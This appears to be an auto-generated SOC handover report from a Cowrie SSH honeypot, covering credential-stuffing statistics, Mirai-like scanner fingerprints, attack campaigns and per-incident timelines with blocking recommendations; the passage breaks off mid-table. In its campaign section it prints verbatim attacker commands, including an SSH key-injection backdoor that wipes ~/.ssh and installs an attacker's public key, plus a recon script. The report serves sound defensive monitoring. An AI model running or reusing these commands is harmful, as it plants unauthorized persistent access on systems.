# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-03 |
| **Generated At** | 2026-08-03T23:06:10Z |
| **Shift Time** | 23:06 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **154** |
| Confirmed Threats | **131** |
| False Positives Filtered | **23** (14.9%) |
| Unique Attacker IPs | **72** |
| Countries of Origin | **28** |
| High Severity Cases | **102** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **52** |
| Malware Samples Analyzed | **3** HIGH · **27** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **108** |
| Unique Credential Pairs | **74** |
| Unique Usernames | **18** |
| Unique Passwords | **45** |
| Successful Auth Pairs | **102** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 24 |
| `admin` | 17 |
| `developer` | 12 |
| `backup` | 6 |
| `apache` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 8 |
| `admin` | 8 |
| `12345678` | 6 |
| `password` | 5 |
| `LeitboGi0ro` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `LeitboGi0ro` | 5 |
| `admin1` | `admin` | 5 |
| `eric` | `eric` | 4 |
| `support` | `support` | 4 |
| `guest` | `123456` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `default` | `80.94.92.179` | 2026-08-03T20:56:59 |
| `root` | `root@1234` | `207.46.224.80` | 2026-08-03T20:57:07 |
| `operator` | `webadmin` | `80.233.12.109` | 2026-08-03T20:57:29 |
| `operator` | `webadmin` | `96.1.40.151` | 2026-08-03T20:57:40 |
| `eric` | `eric` | `10.0.0.73` | 2026-08-03T20:57:50 |
| `root` | `letmein` | `80.94.92.179` | 2026-08-03T20:59:12 |
| `eric` | `eric` | `182.60.128.241` | 2026-08-03T20:59:28 |
| `root` | `passw0rd` | `80.94.92.179` | 2026-08-03T21:01:32 |
| `root` | `password` | `80.94.92.179` | 2026-08-03T21:03:53 |
| `root` | `qwerty` | `80.94.92.179` | 2026-08-03T21:06:18 |
| `root` | `LeitboGi0ro` | `158.178.141.210` | 2026-08-03T21:07:07 |
| `root` | `123@@@` | `158.178.141.210` | 2026-08-03T21:07:08 |
| `root` | `system` | `80.94.92.179` | 2026-08-03T21:11:05 |
| `root` | `toor` | `80.94.92.179` | 2026-08-03T21:13:23 |
| `support` | `support` | `176.53.159.196` | 2026-08-03T21:15:20 |
| `admin` | `111111` | `80.94.92.179` | 2026-08-03T21:15:43 |
| `eric` | `eric` | `177.159.150.111` | 2026-08-03T21:15:49 |
| `eric` | `eric` | `59.46.182.10` | 2026-08-03T21:15:57 |
| `admin` | `123123` | `80.94.92.179` | 2026-08-03T21:18:00 |
| `admin` | `1234` | `80.94.92.179` | 2026-08-03T21:20:14 |
| `admin` | `12345` | `80.94.92.179` | 2026-08-03T21:22:34 |
| `admin` | `123456` | `80.94.92.179` | 2026-08-03T21:24:56 |
| `root` | `nimda` | `122.160.15.31` | 2026-08-03T21:25:32 |
| `root` | `nimda` | `179.181.133.153` | 2026-08-03T21:25:40 |
| `root` | `nimda` | `65.20.237.119` | 2026-08-03T21:25:46 |
| `operator` | `webadmin` | `112.27.129.78` | 2026-08-03T21:26:49 |
| `admin` | `12345678` | `80.94.92.179` | 2026-08-03T21:27:18 |
| `admin` | `123456789` | `80.94.92.179` | 2026-08-03T21:29:29 |
| `admin` | `Administrator` | `80.94.92.179` | 2026-08-03T21:31:36 |
| `sam` | `sam` | `153.37.177.219` | 2026-08-03T21:31:59 |
| `root` | `admin` | `207.46.224.80` | 2026-08-03T21:33:02 |
| `admin` | `access` | `80.94.92.179` | 2026-08-03T21:33:50 |
| `guest` | `123456` | `14.54.22.11` | 2026-08-03T21:33:54 |
| `guest` | `123456` | `112.161.26.125` | 2026-08-03T21:34:03 |
| `admin` | `admin` | `80.94.92.179` | 2026-08-03T21:35:58 |
| `admin` | `admin123` | `80.94.92.179` | 2026-08-03T21:38:12 |
| `admin` | `adminadmin` | `80.94.92.179` | 2026-08-03T21:40:27 |
| `admin` | `letmein` | `80.94.92.179` | 2026-08-03T21:42:41 |
| `admin` | `passw0rd` | `80.94.92.179` | 2026-08-03T21:44:57 |
| `admin` | `password` | `80.94.92.179` | 2026-08-03T21:47:20 |
| `admin` | `password1` | `80.94.92.179` | 2026-08-03T21:49:43 |
| `guest` | `123456` | `93.177.157.179` | 2026-08-03T21:50:32 |
| `guest` | `123456` | `180.76.52.146` | 2026-08-03T21:50:45 |
| `admin` | `qwerty` | `80.94.92.179` | 2026-08-03T21:51:56 |
| `root` | `ubuntu` | `120.48.83.162` | 2026-08-03T21:52:59 |
| `apache` | `1234` | `80.94.92.179` | 2026-08-03T21:54:08 |
| `apache` | `12345678` | `80.94.92.179` | 2026-08-03T21:56:12 |
| `apache` | `admin` | `80.94.92.179` | 2026-08-03T21:58:14 |
| `support` | `support` | `10.0.0.73` | 2026-08-03T21:58:26 |
| `unknown` | `passwd` | `31.173.66.222` | 2026-08-03T21:59:33 |
| `unknown` | `passwd` | `122.160.15.31` | 2026-08-03T21:59:52 |
| `unknown` | `passwd` | `182.75.227.178` | 2026-08-03T22:00:01 |
| `apache` | `apache` | `80.94.92.179` | 2026-08-03T22:00:19 |
| `sam` | `sam` | `59.8.48.41` | 2026-08-03T22:01:05 |
| `sam` | `sam` | `111.70.23.253` | 2026-08-03T22:01:18 |
| `apache` | `password` | `80.94.92.179` | 2026-08-03T22:02:25 |
| `backup` | `123` | `80.94.92.179` | 2026-08-03T22:04:36 |
| `backup` | `backup` | `14.33.96.3` | 2026-08-03T22:06:30 |
| `test` | `9999999` | `10.0.0.73` | 2026-08-03T22:06:44 |
| `backup` | `12345678` | `80.94.92.179` | 2026-08-03T22:06:46 |
| `backup` | `password` | `80.94.92.179` | 2026-08-03T22:08:55 |
| `developer` | `1` | `80.94.92.179` | 2026-08-03T22:11:05 |
| `developer` | `123` | `80.94.92.179` | 2026-08-03T22:13:12 |
| `developer` | `1234` | `80.94.92.179` | 2026-08-03T22:15:21 |
| `admin1` | `admin` | `10.0.0.73` | 2026-08-03T22:15:25 |
| `developer` | `12345` | `80.94.92.179` | 2026-08-03T22:17:38 |
| `developer` | `123456` | `80.94.92.179` | 2026-08-03T22:20:11 |
| `developer` | `1234567` | `80.94.92.179` | 2026-08-03T22:22:36 |
| `test` | `9999999` | `14.54.22.11` | 2026-08-03T22:24:28 |
| `developer` | `12345678` | `80.94.92.179` | 2026-08-03T22:25:07 |
| `developer` | `123456789` | `80.94.92.179` | 2026-08-03T22:27:34 |
| `developer` | `1234567890` | `80.94.92.179` | 2026-08-03T22:29:55 |
| `developer` | `abc123` | `80.94.92.179` | 2026-08-03T22:32:20 |
| `admin1` | `admin` | `101.13.5.26` | 2026-08-03T22:33:51 |
| `admin1` | `admin` | `74.208.177.56` | 2026-08-03T22:34:03 |
| `admin1` | `admin` | `218.95.73.31` | 2026-08-03T22:34:04 |
| `admin1` | `admin` | `196.188.187.85` | 2026-08-03T22:34:17 |
| `developer` | `password` | `80.94.92.179` | 2026-08-03T22:34:42 |
| `backup` | `backup` | `170.233.29.175` | 2026-08-03T22:35:43 |
| `backup` | `backup` | `178.178.222.50` | 2026-08-03T22:35:50 |
| `developer` | `qwerty` | `80.94.92.179` | 2026-08-03T22:37:01 |
| `cache` | `cache` | `89.126.222.149` | 2026-08-03T22:37:31 |
| `345gs5662d34` | `345gs5662d34` | `89.126.222.149` | 2026-08-03T22:37:34 |
| `cache` | `3245gs5662d34` | `89.126.222.149` | 2026-08-03T22:37:36 |
| `jcon0r73` | `qvAKezGkBP2x-stx1C-n` | `189.203.163.10` | 2026-08-03T22:37:50 |
| `345gs5662d34` | `345gs5662d34` | `189.203.163.10` | 2026-08-03T22:37:53 |
| `jcon0r73` | `3245gs5662d34` | `189.203.163.10` | 2026-08-03T22:37:53 |
| `docker` | `123` | `80.94.92.179` | 2026-08-03T22:39:21 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-03T22:39:22 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-03T22:39:23 |
| `test` | `admin123` | `10.0.0.73` | 2026-08-03T22:41:12 |
| `docker` | `123456` | `80.94.92.179` | 2026-08-03T22:41:41 |
| `test` | `admin123` | `27.107.102.154` | 2026-08-03T22:42:36 |
| `test` | `admin123` | `119.160.166.237` | 2026-08-03T22:42:49 |
| `docker` | `12345678` | `80.94.92.179` | 2026-08-03T22:44:00 |
| `docker` | `123456789` | `80.94.92.179` | 2026-08-03T22:46:22 |
| `docker` | `docker` | `80.94.92.179` | 2026-08-03T22:48:40 |
| `ec2-user` | `123456` | `80.94.92.179` | 2026-08-03T22:50:58 |
| `ec2-user` | `12345678` | `80.94.92.179` | 2026-08-03T22:53:18 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-08-03T22:54:05 |
| `root` | `123@@@` | `144.22.238.238` | 2026-08-03T22:54:06 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-08-03T22:54:11 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **154** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 60 |
| OpenSSH | 29 |
| libssh | 15 |
| Paramiko (Python) | 10 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 52 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 29 | 27 |
| `f555226df196...` | Mirai/variant | 6 | 2 |
| `a2de0f306611...` | Mirai/variant | 6 | 2 |
| `6372ee695756...` | Modern SSH client | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 52 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 29 | 27 | Mirai/variant |
| `95420f9d932d...` | libssh | 9 | 3 | — |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 3 | 2 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 51 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.179`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `189.203.163.10`, `89.126.222.149`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **72** |
| Unique ASNs | **55** |
| High-Risk ASNs | **40** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS396982` | Google LLC | 4 | LOW |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |
| `AS48721` | Flyservers S.A. | 2 | HIGH |
| `AS46562` | Performive LLC | 2 | MEDIUM |
| `AS12389` | PJSC Rostelecom | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (102)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c12a0600c2fb

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 20:56 |
| **Last Seen** | 2026-08-03 20:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 20:56:56` | `cowrie.session.connect` |
| `2026-08-03 20:56:57` | `cowrie.client.version` |
| `2026-08-03 20:56:57` | `cowrie.client.kex` |
| `2026-08-03 20:56:59` | `cowrie.login.success` |
| `2026-08-03 20:57:00` | `cowrie.session.params` |
| `2026-08-03 20:57:00` | `cowrie.command.input` |
| `2026-08-03 20:57:00` | `cowrie.command.input` |
| `2026-08-03 20:57:00` | `cowrie.command.input` |
| `2026-08-03 20:57:00` | `cowrie.command.input` |
| `2026-08-03 20:57:00` | `cowrie.command.input` |
| `2026-08-03 20:57:00` | `cowrie.command.success` |
| `2026-08-03 20:57:00` | `cowrie.command.input` |
| `2026-08-03 20:57:00` | `cowrie.command.input` |
| `2026-08-03 20:57:00` | `cowrie.command.input` |
| `2026-08-03 20:57:00` | `cowrie.command.input` |
| `2026-08-03 20:57:01` | `cowrie.log.closed` |
| `2026-08-03 20:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5d7426f7c78

| Field | Detail |
|---|---|
| **Source IP** | `207.46.224[.]80` |
| **First Seen** | 2026-08-03 20:57 |
| **Last Seen** | 2026-08-03 20:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 20:57:06` | `cowrie.session.connect` |
| `2026-08-03 20:57:06` | `cowrie.client.version` |
| `2026-08-03 20:57:06` | `cowrie.client.kex` |
| `2026-08-03 20:57:07` | `cowrie.login.success` |
| `2026-08-03 20:57:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.46.224[.]80` to AbuseIPDB if not already reported
- [ ] Block `207.46.224[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdae89c4c90c

| Field | Detail |
|---|---|
| **Source IP** | `80.233.12[.]109` |
| **First Seen** | 2026-08-03 20:57 |
| **Last Seen** | 2026-08-03 20:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 20:57:28` | `cowrie.session.connect` |
| `2026-08-03 20:57:28` | `cowrie.client.version` |
| `2026-08-03 20:57:28` | `cowrie.client.kex` |
| `2026-08-03 20:57:29` | `cowrie.login.success` |
| `2026-08-03 20:57:29` | `cowrie.direct-tcpip.request` |
| `2026-08-03 20:57:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.233.12[.]109` to AbuseIPDB if not already reported
- [ ] Block `80.233.12[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3511c68ce39

| Field | Detail |
|---|---|
| **Source IP** | `96.1.40[.]151` |
| **First Seen** | 2026-08-03 20:57 |
| **Last Seen** | 2026-08-03 20:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 20:57:39` | `cowrie.session.connect` |
| `2026-08-03 20:57:39` | `cowrie.client.version` |
| `2026-08-03 20:57:39` | `cowrie.client.kex` |
| `2026-08-03 20:57:40` | `cowrie.login.success` |
| `2026-08-03 20:57:40` | `cowrie.direct-tcpip.request` |
| `2026-08-03 20:57:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.1.40[.]151` to AbuseIPDB if not already reported
- [ ] Block `96.1.40[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eca5701082dd

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 20:59 |
| **Last Seen** | 2026-08-03 20:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 20:59:10` | `cowrie.session.connect` |
| `2026-08-03 20:59:10` | `cowrie.client.version` |
| `2026-08-03 20:59:10` | `cowrie.client.kex` |
| `2026-08-03 20:59:12` | `cowrie.login.success` |
| `2026-08-03 20:59:13` | `cowrie.session.params` |
| `2026-08-03 20:59:13` | `cowrie.command.input` |
| `2026-08-03 20:59:13` | `cowrie.command.input` |
| `2026-08-03 20:59:13` | `cowrie.command.input` |
| `2026-08-03 20:59:13` | `cowrie.command.input` |
| `2026-08-03 20:59:13` | `cowrie.command.input` |
| `2026-08-03 20:59:13` | `cowrie.command.success` |
| `2026-08-03 20:59:13` | `cowrie.command.input` |
| `2026-08-03 20:59:13` | `cowrie.command.input` |
| `2026-08-03 20:59:13` | `cowrie.command.input` |
| `2026-08-03 20:59:13` | `cowrie.command.input` |
| `2026-08-03 20:59:14` | `cowrie.log.closed` |
| `2026-08-03 20:59:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-769b85451af0

| Field | Detail |
|---|---|
| **Source IP** | `182.60.128[.]241` |
| **First Seen** | 2026-08-03 20:59 |
| **Last Seen** | 2026-08-03 20:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 20:59:26` | `cowrie.session.connect` |
| `2026-08-03 20:59:26` | `cowrie.client.version` |
| `2026-08-03 20:59:26` | `cowrie.client.kex` |
| `2026-08-03 20:59:28` | `cowrie.login.success` |
| `2026-08-03 20:59:29` | `cowrie.direct-tcpip.request` |
| `2026-08-03 20:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.60.128[.]241` to AbuseIPDB if not already reported
- [ ] Block `182.60.128[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abee94e0514e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:01 |
| **Last Seen** | 2026-08-03 21:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:01:30` | `cowrie.session.connect` |
| `2026-08-03 21:01:31` | `cowrie.client.version` |
| `2026-08-03 21:01:31` | `cowrie.client.kex` |
| `2026-08-03 21:01:32` | `cowrie.login.success` |
| `2026-08-03 21:01:34` | `cowrie.session.params` |
| `2026-08-03 21:01:34` | `cowrie.command.input` |
| `2026-08-03 21:01:34` | `cowrie.command.input` |
| `2026-08-03 21:01:34` | `cowrie.command.input` |
| `2026-08-03 21:01:34` | `cowrie.command.input` |
| `2026-08-03 21:01:34` | `cowrie.command.input` |
| `2026-08-03 21:01:34` | `cowrie.command.success` |
| `2026-08-03 21:01:34` | `cowrie.command.input` |
| `2026-08-03 21:01:34` | `cowrie.command.input` |
| `2026-08-03 21:01:34` | `cowrie.command.input` |
| `2026-08-03 21:01:34` | `cowrie.command.input` |
| `2026-08-03 21:01:34` | `cowrie.log.closed` |
| `2026-08-03 21:01:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c53b6e3fd3a1

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:03 |
| **Last Seen** | 2026-08-03 21:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:03:52` | `cowrie.session.connect` |
| `2026-08-03 21:03:52` | `cowrie.client.version` |
| `2026-08-03 21:03:52` | `cowrie.client.kex` |
| `2026-08-03 21:03:53` | `cowrie.login.success` |
| `2026-08-03 21:03:55` | `cowrie.session.params` |
| `2026-08-03 21:03:55` | `cowrie.command.input` |
| `2026-08-03 21:03:55` | `cowrie.command.input` |
| `2026-08-03 21:03:55` | `cowrie.command.input` |
| `2026-08-03 21:03:55` | `cowrie.command.input` |
| `2026-08-03 21:03:55` | `cowrie.command.input` |
| `2026-08-03 21:03:55` | `cowrie.command.success` |
| `2026-08-03 21:03:55` | `cowrie.command.input` |
| `2026-08-03 21:03:55` | `cowrie.command.input` |
| `2026-08-03 21:03:55` | `cowrie.command.input` |
| `2026-08-03 21:03:55` | `cowrie.command.input` |
| `2026-08-03 21:03:55` | `cowrie.log.closed` |
| `2026-08-03 21:03:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b0b6d53b25e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:06 |
| **Last Seen** | 2026-08-03 21:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
